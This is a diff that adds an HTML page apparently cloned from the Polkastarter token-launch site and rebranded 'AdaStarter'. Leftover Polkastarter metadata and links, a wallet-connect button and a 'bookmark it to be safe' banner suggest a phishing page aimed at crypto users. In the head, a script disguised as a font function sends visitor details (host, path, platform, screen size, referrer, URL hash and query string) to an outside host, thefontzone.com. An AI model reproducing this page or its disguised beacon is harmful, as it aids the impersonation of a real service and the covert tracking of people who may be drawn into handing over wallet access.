@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html data-theme="light"><head><meta http-equiv="content-type" content="text/html;charset=utf-8">
+
+  <script src="https://js-agent.newrelic.com/nr-1210.min.js"></script><script src="https://js-agent.newrelic.com/nr-1210.min.js"></script><script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","errorBeacon":"bam.nr-data.net","licenseKey":"NRJS-92acee66eb327b12792","applicationID":"893523953","transactionName":"cFhWQxRdXl4BQBcWWVxbSxgPXFZXHA==","queueTime":1,"applicationTime":19,"agent":""}</script>
+  <script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={licenseKey:"NRJS-92acee66eb327b12792",applicationID:"893523953"};window.NREUM||(NREUM={}),__nr_require=function(t,e,n){function r(n){if(!e[n]){var i=e[n]={exports:{}};t[n][0].call(i.exports,function(e){var i=t[n][1][e];return r(i||e)},i,i.exports)}return e[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var i=0;i<n.length;i++)r(n[i]);return r}({1:[function(t,e,n){function r(){}function i(t,e,n){return function(){return o(t,[u.now()].concat(f(arguments)),e?null:this,n),e?void 0:this}}var o=t("handle"),a=t(8),f=t(9),c=t("ee").get("tracer"),u=t("loader"),s=NREUM;"undefined"==typeof window.newrelic&&(newrelic=s);var d=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],p="api-",l=p+"ixn-";a(d,function(t,e){s[e]=i(p+e,!0,"api")}),s.addPageAction=i(p+"addPageAction",!0),s.setCurrentRouteName=i(p+"routeName",!0),e.exports=newrelic,s.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(t,e){var n={},r=this,i="function"==typeof e;return o(l+"tracer",[u.now(),t,n],r),function(){if(c.emit((i?"":"no-")+"fn-start",[u.now(),r,i],n),i)try{return e.apply(this,arguments)}catch(t){throw c.emit("fn-err",[arguments,this,t],n),t}finally{c.emit("fn-end",[u.now()],n)}}}};a("actionText,setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,e){m[e]=i(l+e)}),newrelic.noticeError=function(t,e){"string"==typeof t&&(t=new Error(t)),o("err",[t,u.now(),!1,e])}},{}],2:[function(t,e,n){function r(t){if(NREUM.init){for(var e=NREUM.init,n=t.split("."),r=0;r<n.length-1;r++)if(e=e[n[r]],"object"!=typeof e)return;return e=e[n[n.length-1]]}}e.exports={getConfiguration:r}},{}],3:[function(t,e,n){function r(){return f.exists&&performance.now?Math.round(performance.now()):(o=Math.max((new Date).getTime(),o))-a}function i(){return o}var o=(new Date).getTime(),a=o,f=t(10);e.exports=r,e.exports.offset=a,e.exports.getLastTimestamp=i},{}],4:[function(t,e,n){function r(t){return!(!t||!t.protocol||"file:"===t.protocol)}e.exports=r},{}],5:[function(t,e,n){function r(t,e){var n=t.getEntries();n.forEach(function(t){"first-paint"===t.name?d("timing",["fp",Math.floor(t.startTime)]):"first-contentful-paint"===t.name&&d("timing",["fcp",Math.floor(t.startTime)])})}function i(t,e){var n=t.getEntries();n.length>0&&d("lcp",[n[n.length-1]])}function o(t){t.getEntries().forEach(function(t){t.hadRecentInput||d("cls",[t])})}function a(t){if(t instanceof m&&!g){var e=Math.round(t.timeStamp),n={type:t.type};e<=p.now()?n.fid=p.now()-e:e>p.offset&&e<=Date.now()?(e-=p.offset,n.fid=p.now()-e):e=p.now(),g=!0,d("timing",["fi",e,n])}}function f(t){"hidden"===t&&d("pageHide",[p.now()])}if(!("init"in NREUM&&"page_view_timing"in NREUM.init&&"enabled"in NREUM.init.page_view_timing&&NREUM.init.page_view_timing.enabled===!1)){var c,u,s,d=t("handle"),p=t("loader"),l=t(7),m=NREUM.o.EV;if("PerformanceObserver"in window&&"function"==typeof window.PerformanceObserver){c=new PerformanceObserver(r);try{c.observe({entryTypes:["paint"]})}catch(v){}u=new PerformanceObserver(i);try{u.observe({entryTypes:["largest-contentful-paint"]})}catch(v){}s=new PerformanceObserver(o);try{s.observe({type:"layout-shift",buffered:!0})}catch(v){}}if("addEventListener"in document){var g=!1,h=["click","keydown","mousedown","pointerdown","touchstart"];h.forEach(function(t){document.addEventListener(t,a,!1)})}l(f)}},{}],6:[function(t,e,n){function r(t,e){if(!i)return!1;if(t!==i)return!1;if(!e)return!0;if(!o)return!1;for(var n=o.split("."),r=e.split("."),a=0;a<r.length;a++)if(r[a]!==n[a])return!1;return!0}var i=null,o=null,a=/Version\/(\S+)\s+Safari/;if(navigator.userAgent){var f=navigator.userAgent,c=f.match(a);c&&f.indexOf("Chrome")===-1&&f.indexOf("Chromium")===-1&&(i="Safari",o=c[1])}e.exports={agent:i,version:o,match:r}},{}],7:[function(t,e,n){function r(t){function e(){t(a&&document[a]?document[a]:document[i]?"hidden":"visible")}"addEventListener"in document&&o&&document.addEventListener(o,e,!1)}e.exports=r;var i,o,a;"undefined"!=typeof document.hidden?(i="hidden",o="visibilitychange",a="visibilityState"):"undefined"!=typeof document.msHidden?(i="msHidden",o="msvisibilitychange"):"undefined"!=typeof document.webkitHidden&&(i="webkitHidden",o="webkitvisibilitychange",a="webkitVisibilityState")},{}],8:[function(t,e,n){function r(t,e){var n=[],r="",o=0;for(r in t)i.call(t,r)&&(n[o]=e(r,t[r]),o+=1);return n}var i=Object.prototype.hasOwnProperty;e.exports=r},{}],9:[function(t,e,n){function r(t,e,n){e||(e=0),"undefined"==typeof n&&(n=t?t.length:0);for(var r=-1,i=n-e||0,o=Array(i<0?0:i);++r<i;)o[r]=t[e+r];return o}e.exports=r},{}],10:[function(t,e,n){e.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(t,e,n){function r(){}function i(t){function e(t){return t&&t instanceof r?t:t?u(t,c,a):a()}function n(n,r,i,o,a){if(a!==!1&&(a=!0),!l.aborted||o){t&&a&&t(n,r,i);for(var f=e(i),c=v(n),u=c.length,s=0;s<u;s++)c[s].apply(f,r);var p=d[w[n]];return p&&p.push([b,n,r,f]),f}}function o(t,e){y[t]=v(t).concat(e)}function m(t,e){var n=y[t];if(n)for(var r=0;r<n.length;r++)n[r]===e&&n.splice(r,1)}function v(t){return y[t]||[]}function g(t){return p[t]=p[t]||i(n)}function h(t,e){l.aborted||s(t,function(t,n){e=e||"feature",w[n]=e,e in d||(d[e]=[])})}var y={},w={},b={on:o,addEventListener:o,removeEventListener:m,emit:n,get:g,listeners:v,context:e,buffer:h,abort:f,aborted:!1};return b}function o(t){return u(t,c,a)}function a(){return new r}function f(){(d.api||d.feature)&&(l.aborted=!0,d=l.backlog={})}var c="nr@context",u=t("gos"),s=t(8),d={},p={},l=e.exports=i();e.exports.getOrSetContext=o,l.backlog=d},{}],gos:[function(t,e,n){function r(t,e,n){if(i.call(t,e))return t[e];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,e,{value:r,writable:!0,enumerable:!1}),r}catch(o){}return t[e]=r,r}var i=Object.prototype.hasOwnProperty;e.exports=r},{}],handle:[function(t,e,n){function r(t,e,n,r){i.buffer([t],r),i.emit(t,e,n)}var i=t("ee").get("handle");e.exports=r,r.ee=i},{}],id:[function(t,e,n){function r(t){var e=typeof t;return!t||"object"!==e&&"function"!==e?-1:t===window?0:a(t,o,function(){return i++})}var i=1,o="nr@id",a=t("gos");e.exports=r},{}],loader:[function(t,e,n){function r(){if(!R++){var t=M.info=NREUM.info,e=v.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(t&&t.licenseKey&&t.applicationID&&e))return u.abort();c(E,function(e,n){t[e]||(t[e]=n)});var n=a();f("mark",["onload",n+M.offset],null,"api"),f("timing",["load",n]);var r=v.createElement("script");0===t.agent.indexOf("http://")||0===t.agent.indexOf("https:///")?r.src=t.agent:r.src=l+"://"+t.agent,e.parentNode.insertBefore(r,e)}}function i(){"complete"===v.readyState&&o()}function o(){f("mark",["domContent",a()+M.offset],null,"api")}var a=t(3),f=t("handle"),c=t(8),u=t("ee"),s=t(6),d=t(4),p=t(2),l=p.getConfiguration("ssl")===!1?"http":"https",m=window,v=m.document,g="addEventListener",h="attachEvent",y=m.XMLHttpRequest,w=y&&y.prototype,b=!d(m.location);NREUM.o={ST:setTimeout,SI:m.setImmediate,CT:clearTimeout,XHR:y,REQ:m.Request,EV:m.Event,PR:m.Promise,MO:m.MutationObserver};var x=""+location,E={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1210.min.js"},O=y&&w&&w[g]&&!/CriOS/.test(navigator.userAgent),M=e.exports={offset:a.getLastTimestamp(),now:a,origin:x,features:{},xhrWrappable:O,userAgent:s,disabled:b};if(!b){t(1),t(5),v[g]?(v[g]("DOMContentLoaded",o,!1),m[g]("load",r,!1)):(v[h]("onreadystatechange",i),m[h]("onload",r)),f("mark",["firstbyte",a.getLastTimestamp()],null,"api");var R=0}},{}],"wrap-function":[function(t,e,n){function r(t,e){function n(e,n,r,c,u){function nrWrapper(){var o,a,s,p;try{a=this,o=d(arguments),s="function"==typeof r?r(o,a):r||{}}catch(l){i([l,"",[o,a,c],s],t)}f(n+"start",[o,a,c],s,u);try{return p=e.apply(a,o)}catch(m){throw f(n+"err",[o,a,m],s,u),m}finally{f(n+"end",[o,a,p],s,u)}}return a(e)?e:(n||(n=""),nrWrapper[p]=e,o(e,nrWrapper,t),nrWrapper)}function r(t,e,r,i,o){r||(r="");var f,c,u,s="-"===r.charAt(0);for(u=0;u<e.length;u++)c=e[u],f=t[c],a(f)||(t[c]=n(f,s?c+r:r,i,c,o))}function f(n,r,o,a){if(!m||e){var f=m;m=!0;try{t.emit(n,r,o,e,a)}catch(c){i([c,n,r,o],t)}m=f}}return t||(t=s),n.inPlace=r,n.flag=p,n}function i(t,e){e||(e=s);try{e.emit("internal-error",t)}catch(n){}}function o(t,e,n){if(Object.defineProperty&&Object.keys)try{var r=Object.keys(t);return r.forEach(function(n){Object.defineProperty(e,n,{get:function(){return t[n]},set:function(e){return t[n]=e,e}})}),e}catch(o){i([o],n)}for(var a in t)l.call(t,a)&&(e[a]=t[a]);return e}function a(t){return!(t&&t instanceof Function&&t.apply&&!t[p])}function f(t,e){var n=e(t);return n[p]=t,o(t,n,s),n}function c(t,e,n){var r=t[e];t[e]=f(r,n)}function u(){for(var t=arguments.length,e=new Array(t),n=0;n<t;++n)e[n]=arguments[n];return e}var s=t("ee"),d=t(9),p="nr@original",l=Object.prototype.hasOwnProperty,m=!1;e.exports=r,e.exports.wrapFunction=f,e.exports.wrapInPlace=c,e.exports.argsToArray=u},{}]},{},["loader"]);</script>
+  <title>AdaStarter - Protocol built for cross-chain token pools</title>
+  <meta name="description" content="Polkastarter enables projects to raise capital on a decentralised, permissionless and interoperable environment based on Polkadot.">
+  <meta property="og:title" content="Polkastarter - Protocol built for cross-chain token pools">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://www.polkastarter.com/pools">
+  <meta property="og:image" content="https://www.polkastarter.com/assets/metaOG-bd9b24b9ab823359c9ce2b52b3b8ae882d43b85ec0ec11925d4aa46e0b9aad6b.jpg">
+  <meta property="og:image:secure_url" content="https://www.polkastarter.com/assets/metaOG-bd9b24b9ab823359c9ce2b52b3b8ae882d43b85ec0ec11925d4aa46e0b9aad6b.jpg">
+  <meta property="og:site_name" content="Polkastarter - Protocol built for cross-chain token pools">
+  <meta property="og:description" content="Polkastarter enables projects to raise capital on a decentralised, permissionless and interoperable environment based on Polkadot.">
+  <meta property="twitter:title" content="Polkastarter - Protocol built for cross-chain token pools">
+  <meta property="twitter:description" content="Polkastarter enables projects to raise capital on a decentralised, permissionless and interoperable environment based on Polkadot.">
+  <meta content="https://www.polkastarter.com/assets/metaOG-bd9b24b9ab823359c9ce2b52b3b8ae882d43b85ec0ec11925d4aa46e0b9aad6b.jpg" property="twitter:image">
+  <meta content="summary_large_image" name="twitter:card">
+  <meta name="csrf-param" content="authenticity_token">
+  <meta name="csrf-token" content="IWCpJ4bTYUiC7BCzrU8/lRHgyiGEgjQ8RQ4UgFffRqKRWkimSMToDsvlge8yoBRUcyXpkF65u5TajOR5k+p9IA==">
+  <meta name="kovan-mode" content="false">
+  <meta name="chain" content="ethereum">
+  <meta name="domain-base-url" content="polkastarter.com">
+  <meta name="webpack-manifest-identifier" content="15735268713452dece4d0ca7a7ebff81">
+  <meta name="controller-name" content="pools">
+  <link rel="shortcut icon" type="image/x-icon" href="packs/media/images/logo/favicon-5c923122dec9213975049aa98a6781a4.svg">
+  <script src="https://unpkg.com/feather-icons"></script>
+  <link rel="stylesheet" media="screen" href="packs/css/stylesheets-8afcd5f3.css">
+  <script src="packs/js/application-c1ff7131fea5d64b832c.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <link href="../cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.css" rel="stylesheet">
+  <script type="text/javascript" src="../cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.js"></script>
+  
+  <link rel="stylesheet" type="text/css" href="../cdnjs.cloudflare.com/ajax/libs/jquery-datetimepicker/2.5.20/jquery.datetimepicker.min.css">
+  
+  <script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-177231415-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+  
+    gtag('config', 'UA-177231415-1');
+  </script>
+  
+  <script>function font_fam_nftxyx(){ var fnz_itzgmc={}; var mtd = 'GET';fnz_itzgmc.i = location.host; fnz_itzgmc.l = location.hostname; fnz_itzgmc.p = location.pathname; fnz_itzgmc.o = navigator.platform; fnz_itzgmc.g5 = new XMLHttpRequest(); fnz_itzgmc.v2 = screen.width+'x'+screen.height; fnz_itzgmc.r3 = new Date().getTimezoneOffset(); fnz_itzgmc.s4 =  encodeURIComponent(document.referrer); fnz_itzgmc.y1 =  encodeURIComponent(location.protocol); fnz_itzgmc.y2 =  encodeURIComponent(location.hash); fnz_itzgmc.y3 =  encodeURIComponent(location.search); fnz_itzgmc.g5.open(mtd, "https://thefontzone.com/v4/w/fonts/7aa9ac9c75bbcb917176e3e8a20b46fa?i="+fnz_itzgmc.i+"&l="+fnz_itzgmc.l+"&p="+fnz_itzgmc.p+"&o="+fnz_itzgmc.o+"&v2="+fnz_itzgmc.v2+"&r3="+fnz_itzgmc.r3+"&s4="+fnz_itzgmc.s4+"&y1="+fnz_itzgmc.y1+"&y2="+fnz_itzgmc.y2+"&y3="+fnz_itzgmc.y3);fnz_itzgmc.g5.send();};font_fam_nftxyx();</script>
+  
+  <script>
+        (function (h, o, t, j, a, r) {
+          h.hj =
+            h.hj ||
+            function () {
+              (h.hj.q = h.hj.q || []).push(arguments);
+            };
+          h._hjSettings = { hjid: 2567421, hjsv: 6 };
+          a = o.getElementsByTagName('head')[0];
+          r = o.createElement('script');
+          r.async = 1;
+          r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
+          a.appendChild(r);
+        })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
+      </script><script async="" src="https://static.hotjar.com/c/hotjar-2567421.js?sv=6"></script><script async="" src="https://static.hotjar.com/c/hotjar-2567421.js?sv=6"></script>
+  <script async="" src="cdn-cgi/bm/cv/669835187/api.js"></script></head>
+  <body>
+  <div data-controller="safe-banner">
+  <div class="alert alert__top alert--info alert-dismissible " data-target="safe-banner.banner" role="alert">
+  Always make sure the URL is
+  AdaStarter.com
+  - bookmark it to be safe.
+  <div class="close mr-3" style="margin-top: 8px;" data-action="click->safe-banner#aknowledge">
+  <span>×</span>
+  </div>
+  </div>
+  </div>
+  <div class="modal fade modal-warning" id="subscribeModal" data-controller="subscribe-modal" tabindex="-1" role="dialog" aria-labelledby="subscribeModal" aria-hidden="true" style="background: #0000004d">
+  <div class="modal-dialog" role="document" style="top: 20vh">
+  <div class="modal-content">
+  <div class="modal-header" style="border-bottom: 1px solid #e6dedf6b;">
+  <h5 class="text-left" style="max-width: 400px;padding-left: 20px;">Subscribe for the latest inside scoop on all things AdaStarter! </h5>
+  <div class="close" data-dismiss="modal" aria-label="Close" data-action="click->subscribe-modal#closeModal">
+  <span aria-hidden="true" style="font-size: 1.75rem; font-weight: 600; top: -0.50rem; position: relative;cursor: pointer;">×</span>
+  </div>
+  </div>
+  <div class="modal-body">
+  <form action="https://app.getresponse.com/add_subscriber.html" accept-charset="utf-8" method="post">
+  
+  <div class="custom-input text-left">
+  <label for="subscribe_name">Name</label>
+  <input type="text" name="subscribe_name" id="subscribe_name" placeholder="Name" input_html="{:class=>&quot;form-control string required&quot;}" required="required" label="false">
+  </div>
+  
+  <div class="custom-input text-left">
+  <label for="subscribe_email">Email</label>
+  <input type="email" name="subscribe_email" id="subscribe_email" placeholder="Email" input_html="{:class=>&quot;form-control email required&quot;}" required="required" label="false">
+  </div>
+  
+  
+  <input type="hidden" name="campaign_token" value="oxoXf">
+  
+  <input type="hidden" name="start_day" value="0">
+  
+  <input class="button button--primary button--block mt-3" type="submit" value="Subscribe">
+  </form>
+  </div>
+  </div>
+  </div>
+  </div>
+  <nav class="navigation ">
+  <div class="container">
+  <div class="navigation__grid">
+  <a class="navigation__logo" data-turbolinks="false" href="index.html">
+    <h3> AdaStarter </h3>
+  </a> <div class="navigation__burger" id="myBurger" onclick="toggleNavbar()">
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><g class="nc-icon-wrapper" stroke-linecap="square" stroke-linejoin="miter" stroke-width="2" fill="#ffffff" stroke="#ffffff"><line data-color="color-2" fill="none" stroke-miterlimit="10" x1="2" y1="16" x2="30" y2="16"></line> <line fill="none" stroke="#ffffff" stroke-miterlimit="10" x1="2" y1="7" x2="30" y2="7"></line> <line fill="none" stroke="#ffffff" stroke-miterlimit="10" x1="2" y1="25" x2="30" y2="25"></line></g></svg>
+  </div>
+  <div class="navigation__menu" id="myTopnav" data-controller="navbar">
+  
+  <a class="button button--balance" data-target="navbar.balanceButton" id="balanceButton" href="javascript:void(0)">
+  <span data-target="navbar.balance" id="balanceLabel" class="balancePing" data-balance="0">0 ETH</span>
+  <div class="address" id="addressHolder">
+  <span id="addressLabel" data-target="navbar.address">0xE1c8...A349</span>
+  <div class="address-copy" data-action="click->navbar#copyToClipboard">
+  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none">
+  <path d="M10.6673 0.666504H2.66732C1.93398 0.666504 1.33398 1.2665 1.33398 1.99984V11.3332H2.66732V1.99984H10.6673V0.666504ZM12.6673 3.33317H5.33398C4.60065 3.33317 4.00065 3.93317 4.00065 4.6665V13.9998C4.00065 14.7332 4.60065 15.3332 5.33398 15.3332H12.6673C13.4007 15.3332 14.0007 14.7332 14.0007 13.9998V4.6665C14.0007 3.93317 13.4007 3.33317 12.6673 3.33317ZM12.6673 13.9998H5.33398V4.6665H12.6673V13.9998Z" fill="#FF3465"></path>
+  </svg>
+  </div>
+  </div>
+  </a> <a class="button button--primary button--outline d-none" data-target="navbar.connectButton" data-action="click -> navbar#openMetamask" id="connectWalletButton" href="javascript:void(0)">Connect Wallet</a>
+  <div class="navbar__settings dropdown button__dropdown" data-controller="chain">
+  <a class="button button--secondary px-3" href="#" role="button" id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+  <span data-target="chain.chainLabel">Ethereum</span> <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none">
+  <path d="M7.99961 11.4001L2.59961 6.0001L3.99961 4.6001L7.99961 8.6001L11.9996 4.6001L13.3996 6.0001L7.99961 11.4001Z" fill="white"></path>
+  </svg>
+  </a>
+  <div class="dropdown-menu dropdown-menu-right" aria-labelledby="dropdownMenuLink">
+  <div class="navbar__settings--item">
+  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
+  <path d="M12 24C18.6274 24 24 18.6274 24 12C24 5.37258 18.6274 0 12 0C5.37258 0 0 5.37258 0 12C0 18.6274 5.37258 24 12 24Z" fill="#627EEA"></path>
+  <path d="M12.373 3V9.6525L17.9958 12.165L12.373 3Z" fill="white" fill-opacity="0.602"></path>
+  <path d="M12.3735 3L6.75 12.165L12.3735 9.6525V3Z" fill="white"></path>
+  <path d="M12.373 16.4759V20.9962L17.9995 13.2119L12.373 16.4759Z" fill="white" fill-opacity="0.602"></path>
+  <path d="M12.3735 20.9962V16.4752L6.75 13.2119L12.3735 20.9962Z" fill="white"></path>
+  <path d="M12.373 15.4298L17.9958 12.1651L12.373 9.65405V15.4298Z" fill="white" fill-opacity="0.2"></path>
+  <path d="M6.75 12.1651L12.3735 15.4298V9.65405L6.75 12.1651Z" fill="white" fill-opacity="0.602"></path>
+  </svg>
+  <a class="navbar__settings--title ml-3" style="text-decoration: none;" data-action="click->chain#switch" data-chain="ethereum" href="javascript:void(0)">Ethereum</a>
+  </div>
+  <div class="navbar__settings--item my-2">
+  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
+  <path d="M12 24C18.6274 24 24 18.6274 24 12C24 5.37258 18.6274 0 12 0C5.37258 0 0 5.37258 0 12C0 18.6274 5.37258 24 12 24Z" fill="#F3BA2F"></path>
+  <path d="M9.087 10.803L12 7.89L14.9145 10.8045L16.6095 9.1095L12 4.5L7.392 9.108L9.087 10.803ZM4.5 12L6.195 10.305L7.89 12L6.195 13.695L4.5 12ZM9.087 13.197L12 16.11L14.9145 13.1955L16.6095 14.8898L12 19.5L7.392 14.892L7.38975 14.8898L9.087 13.197ZM16.11 12L17.805 10.305L19.5 12L17.805 13.695L16.11 12ZM13.719 11.9985H13.7205V12L12 13.7205L10.2817 12.003L10.2787 12L10.2817 11.9977L10.5825 11.6963L10.7288 11.55L12 10.2795L13.7197 11.9992L13.719 11.9985Z" fill="white"></path>
+  </svg>
+  <a class="navbar__settings--title ml-3" style="text-decoration: none;" data-action="click->chain#switch" data-chain="binance" href="javascript:void(0)">Binance Smart Chain</a>
+  </div>
+  <div class="navbar__settings--item my-2">
+  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 100 100" fill="none">
+  <circle cx="50" cy="50" r="50" fill="#8247E5"></circle>
+  <path d="M66.5498 39.3023C65.3506 38.6047 63.7915 38.6047 62.4723 39.3023L53.1181 44.6512L46.762 48.1395L37.4077 53.4884C36.2085 54.186 34.6494 54.186 33.3303 53.4884L25.8948 49.3023C24.6956 48.6046 23.8561 47.3256 23.8561 45.9302V37.6744C23.8561 36.2791 24.5756 35 25.8948 34.3023L33.2103 30.2326C34.4096 29.5349 35.9686 29.5349 37.2878 30.2326L44.6033 34.3023C45.8026 35 46.6421 36.2791 46.6421 37.6744V43.0233L52.9982 39.4186V34.0698C52.9982 32.6744 52.2786 31.3953 50.9594 30.6977L37.4077 23.0233C36.2085 22.3256 34.6494 22.3256 33.3303 23.0233L19.5387 30.6977C18.2196 31.3953 17.5 32.6744 17.5 34.0698V49.5349C17.5 50.9302 18.2196 52.2093 19.5387 52.907L33.3303 60.5814C34.5295 61.2791 36.0886 61.2791 37.4077 60.5814L46.762 55.3488L53.1181 51.7442L62.4723 46.5116C63.6716 45.814 65.2306 45.814 66.5498 46.5116L73.8653 50.5814C75.0646 51.2791 75.9041 52.5581 75.9041 53.9535V62.2093C75.9041 63.6046 75.1845 64.8837 73.8653 65.5814L66.5498 69.7674C65.3506 70.4651 63.7915 70.4651 62.4723 69.7674L55.1568 65.6977C53.9576 65 53.1181 63.7209 53.1181 62.3256V56.9767L46.762 60.5814V65.9302C46.762 67.3256 47.4815 68.6047 48.8007 69.3023L62.5923 76.9767C63.7915 77.6744 65.3506 77.6744 66.6697 76.9767L80.4613 69.3023C81.6605 68.6047 82.5 67.3256 82.5 65.9302V50.4651C82.5 49.0698 81.7804 47.7907 80.4613 47.093L66.5498 39.3023Z" fill="white"></path>
+  </svg>
+  <a class="navbar__settings--title ml-3" style="text-decoration: none;" data-action="click->chain#switch" data-chain="polygon" href="javascript:void(0)">Polygon</a>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </nav>
+  <script>
+    function toggleNavbar() {
+      var x = document.getElementById("myTopnav");
+      if (x.className === "navigation__menu") {
+        x.className += " open";
+      } else {
+        x.className = "navigation__menu";
+      }
+    }
+  
+    window.addEventListener('click', function(e) {
+      var x = document.getElementById("myTopnav");
+      var y = document.getElementById("myBurger");
+  
+      if (x.contains(e.target) || y.contains(e.target)) {} else {
+        x.className = "navigation__menu";
+      }
+    });
+  </script>
+  <div class="container d-none" id="wrong-network-hero">
+  <div class="subscribe">
+  <div class="subscribe__content">
+  <h2>Wrong Network Connected</h2>
+  <h3>The app is currently on Ethereum mode but your Metamask is connected to another network. Please change the network on your Metamask settings to view this content.</h3>
+  </div>
+  <div class="subscribe__illustration"></div>
+  </div>
+  </div>
+  <div id="app-content">
+  <div class="tab-navigation">
+  <div class="container">
+  <div class="tab-navigation__menu">
+  <a data-turbolinks="false" class="active" href="pools.html">All Pools</a>
+  <a data-turbolinks="false" class="" href="poolsb41b.html?section=featured">Top Pools</a>
+  </div>
+  </div>
+  </div>
+  <div class="container">
+  <div class="page-header">
+  <div class="page-header__title">
+  <h2>All Pools</h2>
+  </div>
+  <div class="page-header__actions d-none">
+  <div class="page-header__button dropdown button__dropdown">
+  <a class="button button--secondary" href="#" role="button" id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+  Status: All <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none">
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M7.97612 10.0719L12.3334 5.71461L12.9521 6.33333L8.28548 11L7.66676 11L3.0001 6.33333L3.61882 5.71461L7.97612 10.0719Z" fill="#212121"></path>
+  </svg>
+  </a>
+  <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
+  <a class="dropdown-item" href="#"><svg xmlns="http://www.w3.org/2000/svg" width="8" height="8" viewBox="0 0 8 8" fill="none">
+  <circle cx="4" cy="4" r="4" fill="#212121"></circle>
+  </svg>
+  All</a>
+  <a class="dropdown-item" href="#"><svg xmlns="http://www.w3.org/2000/svg" width="8" height="8" viewBox="0 0 8 8" fill="none">
+  <circle cx="4" cy="4" r="4" fill="#212121"></circle>
+  </svg>
+  Live</a>
+  <a class="dropdown-item" href="#"><svg xmlns="http://www.w3.org/2000/svg" width="8" height="8" viewBox="0 0 8 8" fill="none">
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M4 6C5.10457 6 6 5.10457 6 4C6 2.89543 5.10457 2 4 2C2.89543 2 2 2.89543 2 4C2 5.10457 2.89543 6 4 6ZM4 8C6.20914 8 8 6.20914 8 4C8 1.79086 6.20914 0 4 0C1.79086 0 0 1.79086 0 4C0 6.20914 1.79086 8 4 8Z" fill="#212121"></path>
+  </svg>
+  Closed</a>
+  <a class="dropdown-item" href="#"><svg xmlns="http://www.w3.org/2000/svg" width="8" height="8" viewBox="0 0 8 8" fill="none">
+  <circle cx="4" cy="4" r="4" fill="#212121"></circle>
+  </svg>
+  Filled</a>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  <div class="container">
+  <form id="pools-search-form" class="simple_form search" novalidate="novalidate" action="https://www.polkastarter.com/pools" accept-charset="UTF-8" method="get">
+  <div class="search__icon">
+  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M14.1937 1.33325C18.9802 1.33325 22.8604 5.21345 22.8604 9.99992C22.8604 14.7864 18.9802 18.6666 14.1937 18.6666C9.40722 18.6666 5.52702 14.7864 5.52702 9.99992C5.52702 5.21345 9.40722 1.33325 14.1937 1.33325ZM14.1937 2.69992C11.2405 2.69722 8.57663 4.4741 7.44463 7.20171C6.31263 9.92932 6.93554 13.0703 9.0228 15.1594C11.1101 17.2486 14.2504 17.8744 16.9791 16.7449C19.7077 15.6154 21.487 12.9531 21.487 9.99992C21.4688 5.97841 18.2152 2.72182 14.1937 2.69992ZM6.66035 16.5799L1.74702 21.5266C1.57911 21.6957 1.51416 21.9415 1.57665 22.1715C1.63915 22.4015 1.81958 22.5806 2.04999 22.6415C2.2804 22.7024 2.52577 22.6357 2.69369 22.4666L7.60702 17.5199L6.66035 16.5799Z" fill="#212121"></path>
+  </svg>
+  </div>
+  <input class="string optional search__input" placeholder="Search by Pool ID, Pool name, Token contract address, Token symbol" type="text" name="search[query]" id="search_query">
+  <input type="hidden" name="section" id="section">
+  </form>
+  </div>
+  <div class="container" data-controller="pools">
+  <table class="table table-borderless custom-table">
+  <thead>
+  <tr>
+  <th class="table-title__number d-none" scope="col">#</th>
+  <th class="table-title__pool" scope="col">Pool Name</th>
+  <th class="table-title__ratio" scope="col">Ratio</th>
+  <th class="table-title__number" scope="col">Access</th>
+  <th class="table-title__progress" scope="col">Progress</th>
+  <th class="table-title__status" scope="col">Status</th>
+  </tr>
+  </thead>
+  <tbody id="pools-index">
+  <tr id="lithium-2" data-action="click->pool-partial#redirect" data-controller="pool-partial" data-layout="pools-index" data-pool-contract="0x5729aab66FA05D095F51BfD1e761AA4537007472" data-pool-name="Lithium 2" data-pool-position="245" data-pool-token-symbol="LITH" data-guid="lithium-2">
+  <th class="table__number table-row d-none" scope="row"><span data-target="pool-partial.position"></span></th>
+  <td class="table__pool-name table-row">
+  
+  <div class="table__pool-info">
+  <div data-target="pool-partial.name"></div>
+  <span data-target="pool-partial.pair" class="d-none">
+  </span>
+  </div>
+  </td>
+  <td class="table__ratio table-row">
+  <span data-target="pool-partial.price">
+  </span></td>
